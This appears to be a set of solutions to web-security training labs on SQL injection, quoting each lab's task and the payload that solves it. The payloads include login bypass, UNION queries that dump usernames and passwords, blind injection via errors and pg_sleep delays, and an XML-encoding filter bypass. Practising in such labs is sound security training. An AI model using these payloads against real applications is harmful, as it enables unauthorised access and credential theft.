```
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

APPRENTICE

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 
```

Crafted payload : 
> /filter?category=category=Gifts'%20or%20'1'='1'--
---
```
Lab: SQL injection vulnerability allowing login bypass

APPRENTICE

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 
```

Crafted payload :  
> or '1' = '1' --
---
```
Lab: SQL injection attack, querying the database type and version on Oracle

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 
```
Crafted payload : 

> /filter?category=Accessories' UNION ALL SELECT CHR(118)|| CHR(101)||CHR(114)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(58)||BANNER,NULL FROM v$version--
---
```
Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 
```

Crafted payload : 
> category=pets' UNION ALL SELECT CONCAT('version : ',@@version),NULL-- -
---
```
Lab: SQL injection attack, listing the database contents on non-Oracle databases

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 
```
> Solved with SQLMAP
---
```
Lab: SQL injection attack, listing the database contents on Oracle

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 
```
Crafted payload : 
> category=' UNION SELECT table_name,NULL FROM all_tables--
Crafted payload : 
> category=' UNION SELECT * FROM USERS_LREGVZ--
---
```
Lab: SQL injection UNION attack, determining the number of columns returned by the query

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 
```
Crafted payload : 
> category=Lifestyle' UNION ALL SELECT NULL,(NULL),NULL--
---
```
Lab: SQL injection UNION attack, finding a column containing text

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 
```
Crafted payload : 
> category=Toys+%26+Games' UNION ALL SELECT NULL,('evt3d3'),NULL--
---
```
Lab: SQL injection UNION attack, retrieving data from other tables

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
```
Crafted payload : 
> category=' UNION SELECT * from users--
---
```
Lab: SQL injection UNION attack, retrieving multiple values in a single column

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
```

Crafted payload : 
> category=Lifestyle' UNION SELECT NULL,username||password from users--
---
```
Lab: Blind SQL injection with conditional responses

PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 
```
> Solved with script1.py
---
```
Lab: Blind SQL injection with conditional errors

PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 
```
> Solved with script2.py

Crafted payload : 
> TrackingId=' AND CAST((SELECT password FROM users LIMIT 1) AS int)=0--;
---
```
Lab: Blind SQL injection with time delays

PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
```

Crafted payload : 
> aze'||pg_sleep(10)--
---
```
Lab: Blind SQL injection with time delays and information retrieval

PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 
```
>  TrackingId=test'||pg_sleep(1)-- 

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(1) ELSE pg_sleep(0) END

> Solved with script3.py
---
```
Lab: SQL injection with filter bypass via XML encoding

PRACTITIONER

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
```

Crafted payload : 
> <@hex_entities>1 UNION SELECT username || password FROM users<@/hex_entities>
